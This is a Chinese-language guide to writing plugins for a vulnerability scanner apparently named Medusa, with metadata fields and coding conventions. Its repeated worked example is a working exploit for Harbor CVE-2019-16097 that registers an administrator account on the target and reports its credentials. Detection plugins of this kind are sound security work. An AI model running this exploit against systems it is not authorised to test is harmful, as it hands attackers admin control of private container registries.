## 插件模板

以`Harbor`插件作为例子

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
import requests
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,randoms
import json
requests.packages.urllib3.disable_warnings()
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2019-16097" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-2-19"  # 插件编辑时间
        self.info['disclosure'] = '2019-9-19'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "HarborAnyAdministratorRegistrationVulnerability"  # 插件名称
        self.info['name'] ='Harbor任意管理员注册漏洞' #漏洞名称
        self.info['affects'] = "Harbor"  # 漏洞组件
        self.info['desc_content'] = "版本中的core/api/user.go文件存在安全漏洞。若开放注册功能，攻击者可利用该漏洞创建admin账户。注册功能默认开放。攻击者可以以管理员身份下载私有项目并审计；可以删除或污染所有镜像。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['version'] = "Harbor1.7.6之前版本\r\nHarbor1.8.3之前版本"  # 这边填漏洞影响的版本
        self.info['suggest'] = "升级最新Harbor版本"  # 修复建议
        self.info['details'] = Medusa  # 结果


def medusa(Url, RandomAgent, ProxyIp=None):
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = '/api/users'
        payload_url = scheme + "://" + url + ":" + str(port) + payload

        headers = {
            'User-Agent': RandomAgent,
            'Accept': 'application/json',
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json",
        }
        rm = "MedusaTextPoc"+randoms().result(5)  # 获取随机数
        data= {
            "username": rm,
            "email": rm+"@qq.com",
            "realname": rm,
            "password": rm,
            "comment": rm,
            "has_admin_role": True
        }

        data = json.dumps(data)
        resp = requests.post(payload_url,data=data,headers=headers, timeout=6, verify=False)
        head = resp.headers.get("Location")
        code = resp.status_code
        if code == 201 and head.find("/api/users/")!=-1:
            Medusa = "{}存在Harbor任意管理员注册漏洞\r\n验证数据:\r\n漏洞位置:{}\r\n账号:{}\r\n密码:{}\r\n注册账号数量:{}\r\n".format(url,
                                                                                                          payload_url,
                                                                                                          rm,rm,head)
            _t = VulnerabilityInfo(Medusa)
            web = VulnerabilityDetails(_t.info)
            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
```

### VulnerabilityInfo函数

```python
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['disclosure']='2019-10-13'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "XXXXXXXXXXXXXXXXXXXX"  # 插件名称
        self.info['name'] ='泛微OA_WorkflowCenterTreeData接口注入漏洞' #漏洞名称
        self.info['affects'] = "该漏洞是哪个组件的，比如这个插件就是叫：泛微OA"  # 漏洞组件
        self.info['desc_content'] = "漏洞描述，比如在组件的哪个版本，哪个位置，有什么危害，什么地方没写好或者没过滤导致的等"  # 漏洞描述
        self.info['rank'] = "这边写危害等级，比如这个插件就该写:高危"  # 漏洞等级
        self.info['suggest'] = "给出缓解措施，或者解决办法"  # 修复建议
        self.info['version'] = "xxx版本-xxx版本"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果需要传入的恒定不变

```

| 函数名       | 值           | 备注                                                         |
| :----------- | ------------ | ------------------------------------------------------------ |
| number       | CVE编号     |  如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD         |
| author       | 插件作者     |                                                              |
| create_date  | 插件编辑时间 | 格式为：年-月-日                                             |
| algroup      | 插件名称     | 要和文件名相同，并且只能英文（必须使用驼峰命名法        |
| name         | 漏洞名称     | 插件的中文名，要与插件名翻译结果相同                         |
| affects      | 漏洞组件     | 该漏洞存在哪个组件中的哪个版本                               |
| desc_content | 漏洞描述     | 漏洞描述，比如在组件的哪个版本，哪个位置，有什么危害，什么地方没写好或者没过滤导致的等 |
| rank         | 漏洞等级     | 分为：严重、高危、中危、低危四个种类                         |
| suggest      | 修复建议     | 给出缓解措施或者解决办法                                   |
| disclosure | 披露时间 | 漏洞披露时间，如果不知道就写编写插件的时间 |
| version      | 漏洞所影响的版本         | 只要写漏洞所影响的版本范围，适用于那些版本     |
| disclosure | 披露时间 | 漏洞披露时间，如果不知道就写编写插件的时间 |


### UrlProcessing函数

对`url`进行处理

```python
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port
```

函数对各个部分进行处理，最终我们只需要取得` scheme` ,` port` , ` hostname` 的值返回给调用函数就行

该函数在`2.7`插件编写规范版本中已写入`ClassCongregation`类中，调用只需要如下操作即可

```python
使用方法一：单独导入
from ClassCongregation import UrlProcessing
scheme, url, port = UrlProcessing().result(Url)
使用方法二：直接导入
import ClassCongregation
scheme, url, port = ClassCongregation.UrlProcessing().result(Url)
```



### medusa函数

```python
def medusa(Url, RandomAgent, ProxyIp=None):
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = '/api/users'
        payload_url = scheme + "://" + url + ":" + str(port) + payload

        headers = {
            'User-Agent': RandomAgent,
            'Accept': 'application/json',
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json",
        }
        rm = "MedusaTextPoc"+randoms().result(5)  # 获取随机数
        data= {
            "username": rm,
            "email": rm+"@qq.com",
            "realname": rm,
            "password": rm,
            "comment": rm,
            "has_admin_role": True
        }

        data = json.dumps(data)
        resp = requests.post(payload_url,data=data,headers=headers, timeout=6, verify=False)
        head = resp.headers.get("Location")
        code = resp.status_code
        if code == 201 and head.find("/api/users/")!=-1:
            Medusa = "{}存在Harbor任意管理员注册漏洞\r\n 验证数据:\r\n漏洞位置:{}\r\n账号:{}\r\n密码:{}\r\n注册账号数量:{}\r\n".format(url,
                                                                                                          payload_url,
                                                                                                          rm,rm,head)
            _t = VulnerabilityInfo(Medusa)
            
            web = VulnerabilityDetails(_t.info)
            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
```

##### 参数

- ###### Url
  - 扫描器传入的链接

- ###### RandomAgent
  - 扫描器传入的随机或者自定义的`User-Agent`

- ###### ~~ProxyIp~~（已弃用）
  - ~~扫描器出入的代理，默认是关闭的~~

##### 注意点:

- ###### 端口

  每个url都必须加上一个端口号，这样后续可以针对单个`URL`进行不同的端口服务的全量扫描

  ```python
  scheme + "://" + url + ":" + str(port) + payload
  ```

- ###### headers
  - 头函数默认初始为如下形式

    ```python
    headers = {
    'User-Agent': RandomAgent,
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
    }
    ```

  - 只有一种情况可以修改该`RandomAgent`值，就是该漏洞只能使用特殊的`User-Agent`头的时候。

  - 如果你的插件需要使用到某些特定的标识的时候，比如可以自行添加，比如上面代码，添加的标识必须符合精简性和通用性

- ###### payload

  - `payload`必须符合随机性，比如这个插件所使用的一些数据不管填写什么都可以通过的话，尽量在后面加入数，这样能够保证`payload`的唯一性，这样验证的时候就能保住数据的唯一性。(特别是注册账号，`DNSlog`，写文件，回显文件之类的`payload`)

- ###### 数据获取

  - `requests`请求后的数据注意事项

    - `status_code`赋值为`code`意义就是返回的状态码，该值名字统一为`code`不可修改

    - `text`赋值为`con`意义就是返回文本内容，该值名字统一为`con`不可修改

    - 请求后的返回`header`头必须使用`resp.headers.get("XXX")`获取，禁止使用`resp.headers["xxx"]`获取。(`xxx`值为你要获取返回`header`值中某一项的名字)

    - 当使用了`request.session()`时，应该在插件结束时使用`request.close()`来主动关闭连接

      ```python
      s=requests.session()
      get=s.get("www.ascotbe.com")
      get.close()
      ```

    - 任何请求必须添加上这三个值

      ```python
      headers=headers
      timeout=6
      verify=False
      ```

- ###### Medusa
  - 该值为漏洞扫描结束的值，需要传给类中，之后封装好调用类写入数据库中

  - 返回结果要可读并且要那种一眼就能看出来的,必须可读容易验证

    ```asciiarmor
    1.1.1.1存在Harbor任意管理员注册漏洞
    验证数据:
    漏洞位置:http://1.1.1.1:80/api/users
    账号:MedusaTextPoc4c5vi
    密码:MedusaTextPoc4c5vi
    注册账号数量:/api/users/10
    ```

  - 如果数据是`Get`请求或者是`Post`请求并存在数据包，应该返回如下信息，验证漏洞直接使用数据包即可(利用`Post`请求举例，`Get`同理)

    ```http
    POST / HTTP/1.1
    Host: www.ascotbe.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/ocsp-request
    Content-Length: 83
    Connection: close
    
    id=1&name=xxx
    ```

  - 比如远程执行如果有回显返回回显内容，如果无回显返回DNSlog验证数据内容

- ###### ~~ProxyIp~~（已弃用）
  - ~~必须存在如下的`if..elif`判断语句，并且里面的值`resp`需要在前面声明全局使用(例:`global resp`~~

- ###### 判断漏洞存在
  - `if`判断一定要唯一性，唯一的返回状态码，唯一只在该漏洞存在的字符串正常页面不会存在的，如下所示:

    ```python
    if code == 201 and head.find("/api/users/")!=-1:
        Medusa = "{}存在Harbor任意管理员注册漏洞\r\n 验证数据:\r\n漏洞位置:{}\r\n账号:{}\r\n密码:{}\r\n注册账号数量:{}\r\n".format(url,
                                                                                                      payload_url,
                                                                                                      rm,rm,head)
        _t = VulnerabilityInfo(Medusa)
        
        web = VulnerabilityDetails(_t.info)
        web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
        WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    ```

- ###### 多个payload
  - 当一个漏洞脚本存在多个`payload`的时候使用循环来验证漏洞，但是这个漏洞第一次验证存在后续还能验证出漏洞的时候，需要在前面声明`Medusas=[]`来存放

  - 切记`try...except`一定要在`for`循环里面，这样如果一个`payload`出错后面的代码也已经可以运行

  - `2.8`插件规范版本中加入了写入类，方便循环写入文件

  - 整体替换如下:

    ```python
    def medusa(Url, RandomAgent, ProxyIp=None):
        scheme, url, port = UrlProcessing().result(Url)
        if port is None and scheme == 'https':
            port = 443
        elif port is None and scheme == 'http':
            port = 80
        else:
            port = port
        Payloads = ['x', 'xx', 'xxx', 'xxxx']
        Medusas = []#存放返回数据
        for payload in Payloads:
            try:
                payload_url = scheme + "://" + url + ":" + str(port) + payload
                headers = {
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept': '*/*',
                    'User-Agent': RandomAgent,
                }
                resp = requests.post(...)
                con = resp.text
                code = resp.status_code
                if code == 200 and con.find(....):
                    Medusa = "{}存在XXX漏洞\r\n验证数据:\r\nRequests:{}\r\n".format(url, con)
                    _t = VulnerabilityInfo(Medusa)
                    web = VulnerabilityDetails(_t.info)
                    WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
                    web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            except:
                _ = VulnerabilityInfo('').info.get('algroup')
                _l = ErrorLog().Write(url, _)  # 调用写入类
    ```

## 插件代码规范

###### 代码中未使用的Package尽量删除

![1.png](https://github.com/Ascotbe/Random-img/blob/master/docute/1.png?raw=true)

###### Dnslog使用规范

- 禁止使用如下形式

  ```python
  from ClassCongregation import Dnslog
  #使用改方法会导致类初始化2次获取的随机数和判断中所获取的随机数不同
  Dnslog().dns_host()#获取随机数
  Dnslog().result()#判断随机数是否请求成功
  ```

- 应当写成如下形式

  ```python
  from ClassCongregation import Dnslog
  dns=Dnslog()#首先初始化
  dns.dns_host()#获取随机数
  dns.result()#判断随机数是否请求成功
  ```


###### 变量命名规范

- 仅限使用`驼峰命名法` 、`匈牙利命名法`
- 默认使用`驼峰命名法`

###### 判断语句

- 在判断中与`None` `False` `True`等值判断时，使用`is` `not` `is not`尽量避免使用`==` `!=`

###### 禁止使用

- 插件中禁止使用`sys.exit()` `os.exit()`这两个函数，会导致主程序结束，如果要结束插件使用`return`即可

###### Https

- 如果请求中包含`HTTPS`，可以使用`verify=False`来关闭SSL证书验证

###### 异常捕获

- 每个函数必须存在`try...except`来保证扫描器正常使用

- 异常捕获`except`必须要有返回值 

  ```python
  except Exception:
      _ = VulnerabilityInfo('').info.get('algroup')
      _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
  ```
  


###### 清理工作

- 插件写完后需要清除所有的`pirint()`函数，以及不必要的变量

###### 多个Payload的for循环

- 当有多个`payload`需要循环的时候必须把`for`循环放到`try`异常捕获里面循环，这很重要！！！！！

###### 写入函数

- 一定要加入`WriteFile().result(str(url),str(Medusa))`这段代码写入
